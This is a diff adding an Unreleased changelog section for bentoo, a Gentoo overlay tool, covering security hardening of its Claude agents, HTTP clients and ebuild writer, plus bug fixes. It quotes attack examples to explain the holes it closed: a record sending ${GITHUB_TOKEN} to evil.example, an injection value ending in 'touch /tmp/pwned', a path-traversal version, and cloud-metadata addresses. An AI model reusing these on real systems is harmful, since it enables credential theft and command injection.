@@ -7,6 +7,241 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **Every `claude` agent bentoo spawns now receives an allow-listed environment,
+  not bentoo's whole one.** The text client, the manifest, registry and build
+  fixers and the bump reviewer used to inherit every variable bentoo had —
+  `GITHUB_TOKEN`, the ntfy token, the SMTP password, every `BENTOO_*` value — in
+  a process that reads untrusted upstream pages. The child now gets only `PATH`,
+  `HOME`, `TMPDIR`, `LANG`, `TERM`, `CLAUDE_CONFIG_DIR`, the CA and proxy
+  variables, and the `LC_*` and `XDG_*` families; the manifest fixer also gets
+  `PORTAGE_*` and exactly one `DISTDIR`, the one the applier computed. In bare
+  mode the resolved API key is the only `ANTHROPIC_API_KEY` entry, so a key the
+  caller's shell exports can no longer sit beside it as a duplicate (this is
+  also why `TestChildEnv_InjectsResolvedKey` failed inside a Claude Code
+  session). `ANTHROPIC_BASE_URL` and the Bedrock/Vertex switches are not on the
+  list, so those setups lose the agents until a later change adds them.
+
+- **One builder now writes every `claude` agent's permission arguments.** Each
+  rule is its own argv element; `Read` and `Edit` are scoped to the agent's own
+  directory as `Read(//<dir>/**)` and `Edit(//<dir>/**)` (writes are scoped
+  through `Edit`, the only rule the CLI consults for them); the secrets files
+  are denied by path; WebFetch is granted only as `WebFetch(domain:<host>)` for
+  hosts that are lowercase DNS names — a host from `packages.toml` or `pkgdev`
+  output that is not one is dropped with a warning, so it cannot widen or forge
+  a rule. Every agent runs with `--permission-mode dontAsk`, no user, project or
+  local settings, no MCP servers or account connectors, and inline settings that
+  block reads outside its working directories and refuse `bypassPermissions`.
+  A directory outside `[A-Za-z0-9._+@/-]` (for example an overlay path with a
+  space) now stops the fixer before it spawns, with an error naming the path.
+
+- **An IPv4 literal never becomes a WebFetch host.** A host whose last label is
+  a number — `127.0.0.1`, `10.0.0.1`, `169.254.169.254`, and the spellings a
+  WHATWG URL parser also reads as an address, such as `127.1` and
+  `127.0.0.0x1` — is dropped with a warning, like any other host that is not a
+  DNS name. The manifest fixer takes hosts from the URLs `pkgdev` prints, which
+  upstream controls, and a literal there would grant a fetch straight to
+  loopback, the internal network or a cloud metadata endpoint. This judges the
+  host's spelling, not its resolution: a DNS name that resolves to such an
+  address (for example `169.254.169.254.nip.io`) is still granted, and only
+  egress rules for the agent's user close that — see `SECURITY.md`.
+
+- **Every agent now runs under those scoped permissions.** The manifest fixer
+  keeps `Read`, `Edit`, `Write`, `Bash(pkgdev *)` and WebFetch — its WebFetch
+  reaches the hosts of the package's `url`/`fallback_url` and the http(s) URLs
+  `pkgdev` printed, plus GitHub; `Bash(wget *)`, `Bash(cat *)` and
+  `Bash(ls *)` are gone. The registry fixer keeps `Read`, `Edit`, `Write` and
+  WebFetch to its entry's own hosts; `Bash(curl *)` is gone. The build fixer's
+  `Read`/`Edit` reach only the staged package directory. The text client (no
+  tools at all) and the bump reviewer (`Read` only) now run in a private 0700
+  directory created for each call and removed afterwards, instead of in
+  bentoo's working directory, which a read-only tool could otherwise read.
+- **BREAKING: a header credential now goes only to the hosts it belongs to.**
+  `packages.toml` lives in the overlay repository, so any contributor could
+  write a record pairing `url = "https://evil.example"` with
+  `X-Api-Key = "${GITHUB_TOKEN}"`, and `bentoo overlay autoupdate --check`
+  would send the maintainer's token there. Each expandable variable is now
+  bound: `GITHUB_TOKEN` to the GitHub hosts over https, `GITLAB_TOKEN` to
+  `https://gitlab.com`, `BENTOO_*` to the host of the package's own `url` or
+  `base_url`. A record that breaks its binding fails its own check, before any
+  request is sent, with a message naming the header, the variable and the
+  host; the rest of the batch runs, and the refused package does not fall back
+  to `fallback_url` or the LLM stage. **Migration:** move a credential that must
+  reach another host into a `BENTOO_*` variable.
+- **BREAKING: `OPENAI_API_KEY` and `ANTHROPIC_API_KEY` are no longer expanded in
+  a header.** No upstream a package names has a reason to receive the
+  maintainer's LLM keys. A reference is now passed through literally with a
+  `Warn`. **Migration:** rename the variable to `BENTOO_*`
+  (e.g. `${BENTOO_OPENAI_API_KEY}`).
+- **A redirect no longer carries a credential to another host or to plain
+  http.** Go forwards custom headers such as `X-Api-Key` and `Private-Token`
+  to whatever host a redirect names; every client that can carry a credential
+  now drops those headers once a redirect chain leaves the original host, and
+  refuses an https-to-http redirect instead of sending the token in
+  cleartext. An authenticated fetch whose form is redirected (307/308) to
+  another host is refused rather than re-posting the serial there.
+- **BREAKING: a GitLab repository must use https, and the automatic GitHub
+  token is sent over https only.** An `http://` GitLab repository URL sent
+  `PRIVATE-TOKEN` in cleartext; it is now rejected with a message saying https
+  is required. A request to `http://api.github.com/` no longer receives the
+  token.
+- **BREAKING: bentoolkit's own secrets are never expanded in a header.**
+  A `BENTOO_*` variable goes to the host of the record's own `url`, and the
+  record's author picks that url, so a `packages.toml` PR naming
+  `${BENTOO_NTFY_TOKEN}`, `${BENTOO_SMTP_PASSWORD}` or a
+  `${BENTOO_REPO_<NAME>_TOKEN}` could have received the maintainer's
+  notification, mail or repository token. Those references now stay literal
+  with a `Warn`. **Migration:** give a header credential its own `BENTOO_*`
+  name. A GitLab URL rejected for not using https is also shown without its
+  userinfo or query, so a token written into it no longer reaches the log.
+
+- **Autoupdate no longer writes a malformed upstream value into an ebuild.** An
+  `aux_pattern` capture and an upstream commit hash used to reach the bash
+  source of the new ebuild unchecked. A captured `x"; touch /tmp/pwned; "`
+  closed the quoted assignment and left a shell command for `emerge` to run.
+  Now an aux value outside `[A-Za-z0-9._+-]{1,128}` and a commit hash that is
+  not 40 lowercase hex are refused before anything is staged:
+  - Under `--apply`, the package is marked failed with the value named, its
+    directory is left byte-identical, and an `--apply all` batch carries on
+    with the others.
+  - Under `--check`, the package is reported skipped with the value named, and
+    no gate runs on it. The check stages the same ebuild and runs `pkgdev
+    manifest` and the configure step on it, so it was a second way in.
+  - The function every ebuild writer calls refuses the value as well, so a
+    writer added later is covered without having to remember the check.
+- **An accepted value is written literally.** The replacement template expanded
+  `$1`/`${2}` inside the value itself, so `a${1}b` became `aMY_BUILD="b`. The
+  value's `$` is now escaped before substitution.
+
+- **A `snapshot.toml` value can no longer inject a directive into btrbk.conf
+  or a systemd unit.** A newline in a value reached `btrbk.conf` or the timer
+  unit as an extra directive, and a config path containing a space, `%` or `$`
+  was split or expanded by systemd. A control character in any value those
+  files use is now refused with an error naming it, and `ExecStart` arguments
+  are quoted and escaped as systemd expects. Ordinary values render exactly as
+  before.
+
+### Fixed
+
+- **One failing upstream no longer stalls every check.** The autoupdate HTTP
+  client kept a single circuit breaker for all hosts, so two dead hosts made
+  every other package fail with "circuit breaker open" for 30 s. Each
+  upstream host:port now has its own breaker, and the refusal names the host
+  that was refused.
+- **Ctrl-C no longer waits out retries and lookups.** A retry wait now ends as
+  soon as the check is cancelled or its deadline passes, and the error says
+  "cancelled" or "deadline exceeded". `overlay compare`, `--list-revivable` and
+  revive stop their in-flight GitHub and GitLab lookups instead of running into
+  their 30 s timeouts. A git-clone lookup no longer starts once the command is
+  cancelled, and a clone already in flight stops with it (it was, and still
+  is, bounded at 2 minutes); updating an existing clone is not yet
+  cancellable.
+- **Retries are spread out and honour `Retry-After`.** The 1 s / 2 s / 4 s
+  backoff is now the ceiling of a random wait, so many packages retrying one
+  host no longer retry in lockstep. A 429 or 503 carrying `Retry-After` waits
+  exactly that long; one asking for more than 60 s, or for longer than the
+  check has left, fails at once with a message naming the host and the wait.
+- **Provider and registry responses are bounded.** GitHub and GitLab API
+  bodies and the repository-registry download are capped at 10 MiB, and the
+  registry download gives up after 30 s and falls back to the eselect cache.
+- **Error causes survive wrapping.** A failed check, retry exhaustion, a
+  manifest or compile failure and an authenticated distfile fetch keep their
+  underlying cause (cancellation, timeout, process exit) reachable, without
+  changing their text; the authenticated fetch still never shows a credential.
+
+- **`overlay rename` no longer overwrites one ebuild with another.** The rename
+  strips the revision, so `foo-1.0.ebuild` and `foo-1.0-r1.ebuild` both mapped
+  to `foo-1.1.ebuild`. Both were moved, the second on top of the first, and the
+  run reported `Renamed 2 ebuild(s)`. The newer revision was silently lost, with
+  or without `--force`. A shared target is now shown in the preview with every
+  source, and the rename exits 1 before prompting and before moving anything,
+  including under `--dry-run`. `--force` does not override this.
+- **`overlay rename` refuses a new version that is not a version.** A value such
+  as `1.2/../../../x` became part of the target path and moved the ebuild out of
+  its package directory. It is now refused before the configuration is read, and
+  the value is named.
+- **A `~name` distdir or distfiles-cache path is refused, not misread.**
+  `~alice/distfiles` was expanded to `$HOME/alice/distfiles`, a directory under
+  the *current* user's home. Only `~` and `~/…` are expanded now. A distdir in
+  the `~name` form fails and names the path; a cache path in that form skips
+  prepopulation, as a missing cache already does.
+- **A bump whose auxiliary value could not be resolved is held, not shipped
+  stale.** When a package declares `aux_pattern` or `commit_sha_path` and that
+  value cannot be fetched or captured, the check used to queue the bump anyway,
+  and the new ebuild shipped the previous release's `MY_BUILD` or `BUILD_ID`.
+  The check now records the cause and leaves the pending list alone. The value
+  is fetched again on the next check, so the bump goes through on its own once
+  upstream serves it.
+
+- **Versions are now ordered by PMS §3.3, so distinct versions no longer compare
+  equal.** The comparison dropped the trailing letter, ranked only the first
+  suffix and padded numeric components with zeros: `1.1.1w` and `1.1.1v`,
+  `1.0_rc1_p1` and `1.0_rc1`, `1.0.0` and `1.0` all read as one version, and
+  `1.01` read as `1.1`. Every number is now compared at any length, so large
+  date stamps no longer collapse either.
+
+  `overlay compare`, baseline selection and autoupdate may therefore report a
+  different newest version for such pairs — a package once shown as up to date
+  can now show as outdated. A string that fails the version grammar now orders
+  below every real version instead of being read as a near-zero one.
+
+- **`bentoo snapshot run` ships through `archive` and `restic` again.** Both
+  engines returned a snapshot without its path, so the ship ran
+  `btrfs send ""` or bound-mounted an empty path and failed on every run. The
+  path is now carried from snapper and btrbk, and a snapshot neither engine can
+  identify is refused before anything runs.
+- **An `ssh` ship under the snapper engine is refused instead of reporting a
+  success that sent nothing.** Only btrbk sends to ssh targets; the config is
+  now rejected with a message pointing at `archive` or `restic`.
+- **A restic snapshot mount is never deleted while it may still be mounted.**
+  The cleanup ignored a failed unmount and then removed the mountpoint
+  recursively, walking into the snapshot. It now leaves the directory in place
+  when the unmount fails, and removes it only after a successful one.
+- **The archive ship streams instead of holding each stage in memory.** A
+  multi-GB `btrfs send` was held in RAM about twice. The stages are now
+  connected by pipes, and a failed upload removes the partial object it left.
+  Restore still waits for the download and decompression to succeed before
+  `btrfs receive` starts, so a failed download leaves no partial subvolume.
+- **A half-written bentoo block no longer eats `/etc/portage/bashrc`.** A begin
+  marker with no end marker made install and uninstall drop every line after
+  it, or the whole file. Both now stop with an error naming the file and how
+  to repair the block.
+- **An SMTP server that stops answering no longer hangs the timer-driven run.**
+  Sending a notification is bounded at 15 s and stops when the run is
+  cancelled; the error names the step and the server, never the password or
+  the message.
+
+### Changed
+
+- **A tool the agent was refused is now named in the failure.** When a fixer
+  or the bump reviewer fails, the error ends with `refused tools:` and the
+  refused tools — `WebFetch(<host>)` for a fetch, the bare name otherwise —
+  and never the refused call's input. When a manifest or registry fix
+  "succeeds" but its re-check fails, the "still failed" / "still failing after
+  fix" message adds `(agent was refused: …)`. Nothing retries with wider
+  permissions, and no setting widens an agent's tools, hosts or paths.
+
+- **`HTTP_PROXY`, `HTTPS_PROXY` and `NO_PROXY` are honoured** by every client
+  built on the shared transport, including the GitHub and GitLab providers,
+  which used to connect directly.
+- **A server that accepts a connection but sends no response headers within
+  30 s** now ends the attempt as a timeout; the autoupdate client retries it
+  like any other timeout. A larger
+  `http_timeout` raises this wait with it, and the Ollama client waits up to
+  its full 120 s for a non-streaming reply.
+
+### Documentation
+
+- **`SECURITY.md` now states the boundary the code enforces.** It listed 0.11.x
+  as the supported version and claimed that only secret paths ever reached a
+  subprocess, while every agent inherited the values. It now lists 0.31.x,
+  says which environment an agent receives and that other subprocesses
+  (`pkgdev`, `git`, `ebuild`) still inherit bentoo's, and gains an "LLM Agents"
+  section: each agent's tools and directory scope, the denied secrets paths,
+  the WebFetch host rule, the pinned settings, and the residual risk that
+  permission rules do not confine a program such as `pkgdev` run by the agent.
+
 ## [0.31.1] - 2026-09-22
 
 A maintenance release: dependency updates, one piece of source hygiene, and the
@@ -1047,7 +1282,6 @@ below for why that is a measurement rather than a hope.
   not yet emitted; `--export` still writes the shape it wrote before. The commits
   that move the renderers and the check onto it say so where they land.
 
-
 ### Fixed
 
 - **Every requirement number in this story's comments now names the story that
@@ -1168,7 +1402,6 @@ below for why that is a measurement rather than a hope.
       overlay autoupdate --check, overlay with no packages.toml
       control:          exit 1, "failed to initialize checker: … packages.toml not found in overlay"
       BENTOO_UI=bogus:  exit 1, identical message
-
 
 - **`overlay validate` states a refused ambient render mode too, and `--json`
   stops advertising a value it never took.** Two follow-ups to the entry above,
@@ -3882,7 +4115,6 @@ below for why that is a measurement rather than a hope.
   recurring case: the tooling that opens them does not write changelog entries,
   so the omission was silent by construction. Now it is loud. Verified against
   six cases, including the two that must fail.
-
 
 ### Changed
 - Bumped dependencies: `github.com/antchfx/xpath` v1.3.7 → v1.3.8,
